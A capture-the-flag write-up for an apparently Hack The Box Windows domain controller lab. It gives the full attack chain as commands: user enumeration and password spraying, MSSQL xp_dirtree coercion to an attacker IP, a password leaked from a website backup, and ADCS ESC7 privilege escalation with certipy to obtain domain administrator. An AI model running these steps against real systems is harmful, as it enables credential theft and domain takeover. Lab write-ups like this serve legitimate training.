#Pwned! 
```IP
10.10.11.236
```
# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 10.10.11.236 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus     
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-29 16:29:33Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127     
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49721/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49768/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## HTTP 80
nothing interesting after fuzzing and analyzing source code
## Kerberos 88
kerbrute user enumeration:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229104001.png?raw=true)
## SMB
```
nxc smb 10.10.11.236 -u 'test' -p '' --shares
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229104137.png?raw=true)
```
nxc smb 10.10.11.236 -u 'test' -p '' --rid-brute 3000
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229104147.png?raw=true)
We have no interesting shares apparently.
After some trial and error, I discovered that we get a hit with `operator` if we make the user list without capital letters:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229112128.png?raw=true)
```
operator:operator
```

## LDAP
operator is a hit too if we execute nxc against ldap protocol:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229113313.png?raw=true)
However ldapsearch doesn't seem capable of retrieving much data:
```
ldapsearch -H ldap://dc01.manager.htb -x -D 'operator@manager.htb' -w 'operator' -b "DC=manager,DC=com"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229113253.png?raw=true)
So we will use ldapdomaindump:
```
ldapdomaindump -u management.htb\\operator -p 'operator' 10.10.11.236 -o ./
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229113421.png?raw=true)
We see that raven is apparently the only user capable of connecting remotely. Let's try bruteforcing his password:
```
nxc winrm 10.10.11.236 -u raven -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```
But we have no success.
## MSSQL
We can access the database with operator:operator
```
impacket-mssqlclient Operator@manager.htb -windows-auth
```
cmdshell is disabled, but we can execute xp_dirtree:
```
xp_dirtree '\\10.10.14.9\test'
```
And we get a manager hash, that we can't crack neither with john or hashcat.

# Exploitation
In MSSQL, we can also enumerate the C directories in the target machine with dirtree. This path will lead us to a old backup of the website inside the inetpub/wwwroot directory:
```
xp_dirtree C:\inetpub\wwwroot
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229115042.png?raw=true)
We should be able to download it with a browser. Once downloaded, I create a new folder in my local machine and unzip its contents there:
```
unzip website-backup-27-07-23-old.zip -d backup-old
```
Inside `.old-conf.xml` we find a password for user raven:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229115425.png?raw=true)
Let's try our credentials on winrm:
```
R4v3nBe5tD3veloP3r!123
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229115655.png?raw=true)
We get access to raven and its user.txt flag.
# PrivEsc

## Manual
After some unsuccessful manual enumeration, knowing that it is a windows domain, we are left with certificates (ADCS) and Bloodhound.
```
certipy-ad find -vulnerable -stdout -u raven@10.10.11.236 -p 'R4v3nBe5tD3veloP3r!123'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229122653.png?raw=true)
We can see how to escalate this vulnerability in the official certipy page:
https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7
```
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```
```
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```
```
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb
```
```
certipy-ad ca -ca manager-DC01-CA -issue-request 20 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```
```
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 20
```
We can now retrieve an NTLM hash with our administrator.pfx:
```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229125317.png?raw=true)
We get an error message because the target machine date and our VM date differs too much. We can synchronize the dates with ntpdate tool:
```
sudo ntpdate 10.10.11.236
```
And now we can use evil-winrm to get an administrator shell and the root flag:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241229125417.png?raw=true)

## Automated

### Peass
### Mimikatz

# Lateral Movement

